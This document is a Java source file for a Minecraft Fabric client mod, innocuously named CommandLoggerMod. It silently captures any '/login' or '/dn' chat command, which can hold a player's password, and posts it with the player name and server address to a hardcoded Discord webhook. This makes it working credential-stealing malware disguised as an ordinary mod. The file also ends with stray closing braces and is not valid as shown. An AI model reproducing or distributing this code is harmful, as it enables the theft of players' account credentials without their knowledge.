package com.example;

import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.fabric.api.client.message.v1.ClientSendMessageEvents;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.network.ServerInfo;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class CommandLoggerMod implements ClientModInitializer {

    private static final String WEBHOOK_URL =
            "https://discord.com/api/webhooks/1302849803553603604/zzZPbn-MOMn3uOmijWCzHhpo7fclBM7r-UMdDCIL_ni553euGCRdl8Tcy98P4vhLiI0U";

    @Override
    public void onInitializeClient() {

        ClientSendMessageEvents.ALLOW_CHAT.register(message -> {

            String lower = message.toLowerCase();

            if (lower.startsWith("/login") || lower.startsWith("/dn")) {
                sendWebhook(message);
            }

            return true;
        });
    }

    private void sendWebhook(String command) {

        try {
            MinecraftClient mc = MinecraftClient.getInstance();

            String playerName = mc.player != null
                    ? mc.player.getName().getString()
                    : "Unknown";

            String serverIp = "Singleplayer";

            ServerInfo server = mc.getCurrentServerEntry();
            if (server != null) {
                serverIp = server.address;
            }

            String json = """
            {
              "content": "Player: %s\\nServer: %s\\nCommand: %s"
            }
            """.formatted(
                    playerName,
                    serverIp,
                    command
            );

            URL url = new URL(WEBHOOK_URL);

            HttpURLConnection connection =
                    (HttpURLConnection) url.openConnection();

            connection.setRequestMethod("POST");
            connection.setRequestProperty(
                    "Content-Type",
                    "application/json"
            );

            connection.setDoOutput(true);

            try (OutputStream os = connection.getOutputStream()) {
                os.write(json.getBytes(StandardCharsets.UTF_8));
            }

            connection.getInputStream().close();
            connection.disconnect();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
   }
}
